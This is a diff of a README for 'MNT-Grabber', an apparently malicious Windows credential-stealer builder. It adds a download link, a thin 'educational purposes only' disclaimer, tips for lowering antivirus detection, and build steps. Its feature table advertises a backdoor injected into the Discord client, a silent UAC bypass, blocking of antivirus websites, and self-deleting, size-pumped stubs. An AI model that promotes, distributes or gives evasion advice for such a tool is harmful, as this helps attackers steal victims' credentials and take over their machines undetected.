@@ -3,27 +3,22 @@
 </h1>
 <p align= "center">
    <kbd>
-   <img  src="https://github.com/MNT-W/MNT-Grabber/workflows/image.png=">
+   <img  src="https://raw.githubusercontent.com/MNT-W/MNT-Grabber/main/.github/workflows/image.png">
    </kbd><br><br>
-   <img src="https://img.shields.io/github/languages/top/MNT-W/MNT Grabber">
-   <img src="https://img.shields.io/github/stars/MNT-W/MNT Grabber">
-   <img src="https://img.shields.io/github/forks/MNT-W/MNT Grabber">
+   <img src="https://img.shields.io/github/languages/top/MNT-W/MNT-Grabber">
+   <img src="https://img.shields.io/github/stars/MNT-W/MNT-Grabber">
+   <img src="https://img.shields.io/github/forks/MNT-W/MNT-Grabber">
    <br>
-   <img src="https://img.shields.io/github/last-commit/MNT-W/MNT Grabber">
-   <img src="https://img.shields.io/github/license/MNT-W/MNT Grabber">
+   <img src="https://img.shields.io/github/last-commit/MNT-W/MNT-Grabber">
+   <img src="https://img.shields.io/github/license/MNT-W/MNT-Grabber">
    <br>
-   <img src="https://img.shields.io/github/issues/MNT-W/MNT Grabber">
-   <img src="https://img.shields.io/github/issues-closed/MNT-W/MNT Grabber">
+   <img src="https://img.shields.io/github/issues/MNT-W/MNT-Grabber">
+   <img src="https://img.shields.io/github/issues-closed/MNT-W/MNT-Grabber">
    <br>
    <br>
    <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
 </p>
 
-## Project Status: Coming to an End
-
-Certified Dumper
-Certified Skid
-MNT-W
 
 ## Table of Contents
 
@@ -32,11 +27,16 @@ MNT-W
 - [Stub Settings](#stub-settings)
 - [Requirements](#requirements)
 - [How to Build?](#how-to-build)
-- [Support the Project](#support-the-project)
 
 ## Download
 
-[![Download]([https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/MNT-W/MNT Grabber](https://github.com/MNT-W/MNT-Grabber.git))
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/MNT-WMNT-Grabber/archive/refs/heads/main.zip)
+
+**Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
+
+**Note:** If the grabber fails to function, attempt rebuilding it without enabling the "Anti VM" option.
+
+**Note 2:** To decrease the chances of detections, you can download [MingGW-w64 (with GCC)](https://github.com/niXman/mingw-builds-binaries/releases/download/13.1.0-rt_v11-rev1/x86_64-13.1.0-release-win32-seh-msvcrt-rt_v11-rev1.7z) and include the "bin" folder in the PATH variable.
 
 ## Features
 
@@ -85,16 +85,16 @@ MNT-W
 | **Melt Stub** | Deletes the stub after use. |
 | **Pump Stub** | Pumps the stub upto the provided size. |
 | **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/MNT-W/MNT-Grabber/issues/117)). |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
 
-**Supports:** *Windows 8+ (Tested on Windows 10,11).*
+**Supports:** *Windows 8+ (Tested on Windows 10).*
 
 ## Requirements
 
 **To build the stub, you need:**
-- Windows 8+ (10,11)
+- Windows 10.
 - Python 3.10+.
 - An active internet connection.
 
@@ -102,6 +102,7 @@ MNT-W
 
 1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download MNT Grabber](#download).
-4. Navigate to the **MNT Grabber** folder and double click *Builder.bat* file.
-5. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
+3. [Download MNT-Grabber](#download).
+4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
+5. Navigate to the **MNT-Grabber** folder and double click *Builder.bat* file.
+6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
